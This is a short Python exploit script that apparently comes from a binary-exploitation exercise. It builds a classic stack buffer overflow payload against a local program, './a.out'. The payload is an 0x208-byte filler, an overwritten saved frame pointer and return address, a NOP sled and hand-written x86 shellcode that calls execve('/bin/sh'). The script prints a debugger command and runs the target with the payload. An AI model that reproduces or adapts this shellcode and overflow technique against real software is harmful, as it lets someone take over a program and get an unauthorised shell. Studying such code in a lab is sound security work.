#!/usr/bin/env python
import struct
from subprocess import call

#endianess convertion
def conv(num):
  return struct.pack("<I",num)

#Spawn a shell
#execve(/bin/sh)
scode = b"\x31\xd2\x42\x42\x42\x42\x29\xd4\x31\xc0\x89\x04\x24\xbb\xaa\xaa\xaa\xaa\x01\xd3\x01\xd3\x4b\x88\x03\x43\x29\xd3\x29\xd3\x29\xd4\x89\x1c\x24\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
scode += (100 - len(scode)) * b"\x90"
print(len(scode))

ebp = 0xffffdc58

#Stack address where shellcode is copied.
ret_addr = ebp + 8
sh = b"/bin/sh"
scode = scode.replace(b"\xaa\xaa\xaa\xaa", conv(ret_addr + len(scode)))

# nk + RA + NOP's + Shellcode
buf = b"A" * 0x208
buf += conv(ebp)
buf += conv(ret_addr)
buf += scode
buf += sh
print("""r `python -c "import sys; sys.stdout.write(""", buf, """)"`""")
call(["./a.out", buf])
